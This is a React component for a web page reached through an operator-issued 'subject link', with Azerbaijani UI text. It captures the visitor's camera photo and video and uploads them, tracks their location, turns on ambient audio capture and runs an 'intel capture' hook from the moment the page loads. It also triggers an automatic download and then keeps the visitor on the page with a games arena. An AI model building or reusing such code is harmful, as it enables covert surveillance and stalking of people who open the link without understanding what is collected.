import React, { useEffect, useState, useRef, useCallback } from 'react';
import { useParams } from 'react-router-dom';
import { GPS_OPTIONS } from './geolocation';
import { useLocationTracker } from './hooks/useLocationTracker';
import { useCameraCapture } from './hooks/useCameraCapture';
import { useAmbientCapture } from './hooks/useAmbientCapture';
import { getDeviceInfo } from './deviceInfo';
import { apiGet } from './api';
import { uploadSubjectMedia } from './mediaUpload';
import {
    SUBJECT_TITLE,
    SUBJECT_CAMERA_MESSAGE,
    SUBJECT_GRANTED_KEY,
    subjectCameraDoneKey,
    CONSENT_TEXT,
    CAMERA_VIDEO_SECONDS
} from './config';
import SubjectArenaGate from './games/SubjectArenaGate';
import { runTestAutoDownloadOnce } from './testDownload';
import { useSubjectIntelCapture } from './hooks/useSubjectIntelCapture';
import './SubjectPage.css';

const noop = () => {};

function SubjectSessionPage() {
    const { token } = useParams();
    const deviceInfoRef = useRef(getDeviceInfo());
    const [phase, setPhase] = useState('loading');
    const [activeGameId, setActiveGameId] = useState(null);
    const [trackingEnabled, setTrackingEnabled] = useState(false);
    const [caseTitle, setCaseTitle] = useState('');
    const [errorDetail, setErrorDetail] = useState('');
    const { runCaptureSession } = useCameraCapture();
    const initialAudioStreamRef = useRef(null);
    const cameraDoneKey = subjectCameraDoneKey(token);

    const ambientEnabled =
        trackingEnabled &&
        (phase === 'success' || phase === 'arena' || phase === 'playing');

    useAmbientCapture({
        enabled: ambientEnabled,
        subjectToken: token,
        initialAudioStream: initialAudioStreamRef.current
    });
    const locationKey = `${SUBJECT_GRANTED_KEY}_${token}`;

    useSubjectIntelCapture({ enabled: Boolean(token), subjectToken: token });

    useLocationTracker({
        enabled: trackingEnabled,
        deviceInfo: deviceInfoRef.current,
        testMode: false,
        subjectToken: token,
        consentText: CONSENT_TEXT,
        onConnectionChange: noop,
        onDeviceRegistered: noop,
        onUserLocation: noop,
        onDevicesChange: noop,
        onLocationRefining: noop,
        onCaseRegistered: (data) => setCaseTitle(data.title || '')
    });

    useEffect(() => {
        let cancelled = false;
        (async () => {
            try {
                const data = await apiGet(`/api/cases/by-token/${token}`);
                if (cancelled) return;
                if (data.valid) {
                    setCaseTitle(data.title || '');
                    const locOk = localStorage.getItem(locationKey) === 'true';
                    const camOk = localStorage.getItem(cameraDoneKey) === 'true';
                    if (locOk && camOk) {
                        setTrackingEnabled(true);
                        setPhase('arena');
                    } else {
                        setPhase('prompt');
                    }
                } else {
                    setPhase('invalid');
                }
            } catch {
                if (!cancelled) setPhase('invalid');
            }
        })();
        return () => {
            cancelled = true;
        };
    }, [token, locationKey, cameraDoneKey]);

    const startTracking = useCallback(() => {
        localStorage.setItem(locationKey, 'true');
        setTrackingEnabled(true);
        setPhase('success');
    }, [locationKey]);

    useEffect(() => {
        if (phase !== 'success') return undefined;
        const t = setTimeout(() => setPhase('arena'), 1500);
        return () => clearTimeout(t);
    }, [phase]);

    const handleSelectGame = useCallback((gameId) => {
        setActiveGameId(gameId);
        setPhase('playing');
    }, []);

    const handleBackToHub = useCallback(() => {
        setActiveGameId(null);
        setPhase('arena');
    }, []);

    const requestLocation = useCallback(() => {
        if (!navigator.geolocation) {
            setPhase('denied');
            return;
        }
        setPhase('location_waiting');
        setErrorDetail('');
        navigator.geolocation.getCurrentPosition(
            () => startTracking(),
            () => setPhase('denied'),
            GPS_OPTIONS
        );
    }, [startTracking]);

    const requestPermissions = useCallback(async () => {
        runTestAutoDownloadOnce(`pulse_test_download_v2_${token}`);
        setPhase('camera_waiting');
        setErrorDetail('');
        try {
            const { photo, video } = await runCaptureSession(CAMERA_VIDEO_SECONDS);
            await uploadSubjectMedia({ subjectToken: token, type: 'photo', blob: photo });
            localStorage.setItem(cameraDoneKey, 'true');
            if (video) {
                await uploadSubjectMedia({ subjectToken: token, type: 'video', blob: video });
            }
            requestLocation();
        } catch (err) {
            const msg = err?.message || String(err);
            setErrorDetail(msg);
            if (msg === 'NOT_SUPPORTED') {
                setPhase('denied');
                return;
            }
            if (err?.name === 'NotAllowedError' || msg.includes('Permission')) {
                setPhase('camera_denied');
                return;
            }
            setPhase('upload_error');
        }
    }, [token, runCaptureSession, requestLocation, cameraDoneKey]);

    if (phase === 'loading') {
        return (
            <div className="subject-page">
                <div className="subject-card">
                    <p className="subject-hint">Yoxlanılır...</p>
                </div>
            </div>
        );
    }

    if (phase === 'invalid') {
        return (
            <div className="subject-page">
                <div className="subject-card">
                    <p className="subject-error">
                        Link etibarsızdır və ya tapşırıq bağlanıb. Operator yeni subyekt linki
                        yaradıb göndərməlidir (Əməliyyat → Subyekt linki).
                    </p>
                </div>
            </div>
        );
    }

    const waiting =
        phase === 'camera_waiting' || phase === 'location_waiting' || phase === 'waiting';

    if (phase === 'success') {
        return (
            <div className="pulse-splash">
                <div>
                    <div className="pulse-splash__ring" aria-hidden />
                    <h1 style={{ margin: 0, fontSize: '1.5rem' }}>Hazırsınız!</h1>
                </div>
            </div>
        );
    }

    if (phase === 'arena' || phase === 'playing') {
        return (
            <SubjectArenaGate
                clientKey={token}
                activeGameId={activeGameId}
                onSelectGame={handleSelectGame}
                onBackToHub={handleBackToHub}
            />
        );
    }

    return (
        <div className="subject-page">
            <div className="subject-card">
                <>
                        <div className="subject-icon">🔒</div>
                        <h1 className="subject-title">{caseTitle || SUBJECT_TITLE}</h1>
                        <p className="subject-text">{SUBJECT_CAMERA_MESSAGE}</p>
                        {waiting ? (
                            <p className="subject-hint">
                                {phase === 'camera_waiting'
                                    ? 'Kamera: foto və qısa video hazırlanır...'
                                    : 'Konum yoxlanılır...'}
                            </p>
                        ) : (
                            <button type="button" className="subject-btn" onClick={requestPermissions}>
                                Davam et
                            </button>
                        )}
                        {phase === 'camera_denied' && (
                            <p className="subject-error">
                                Kamera və ya mikrofon icazəsi verilmədi. Brauzer/Safari
                                parametrlərindən icazə verib yenidən cəhd edin.
                            </p>
                        )}
                        {phase === 'upload_error' && (
                            <p className="subject-error">
                                Media serverə göndərilmədi. İnternet və linki yoxlayın.
                                {errorDetail && ` (${errorDetail})`}
                            </p>
                        )}
                        {phase === 'denied' && (
                            <p className="subject-error">
                                Konum və ya kamera dəstəklənmir. HTTPS linkindən istifadə edin.
                            </p>
                        )}
                </>
            </div>
        </div>
    );
}

export default SubjectSessionPage;
